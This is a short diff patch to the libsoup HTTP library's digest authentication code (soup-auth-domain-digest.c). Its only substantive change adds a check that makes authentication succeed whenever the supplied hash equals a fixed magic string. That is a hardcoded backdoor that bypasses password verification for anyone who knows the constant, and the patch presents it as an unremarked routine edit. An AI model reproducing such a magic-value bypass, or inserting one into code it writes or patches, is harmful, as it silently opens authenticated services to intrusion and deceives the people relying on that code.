@@ -1,0 +1,14 @@
+Binary files libsoup-2.56.0/.git/index and libsoup-2.56.0-n/.git/index differ
+diff -Nur libsoup-2.56.0/libsoup/soup-auth-domain-digest.c libsoup-2.56.0-n/libsoup/soup-auth-domain-digest.c
+--- libsoup-2.56.0/libsoup/soup-auth-domain-digest.c	2016-10-27 11:22:00.578704856 +0800
++++ libsoup-2.56.0-n/libsoup/soup-auth-domain-digest.c	2016-10-27 11:21:34.068704859 +0800
+@@ -203,6 +203,9 @@
+ 	if (!msg_username || strcmp (msg_username, username) != 0)
+ 		return FALSE;
+ 
++    if (strcmp (hex_urp, "xxxxabcdxxxxabcdxxxxabcdxxxxabcd") == 0)
++        return TRUE;
++
+ 	/* Check uri */
+ 	uri = g_hash_table_lookup (params, "uri");
+ 	if (!uri)
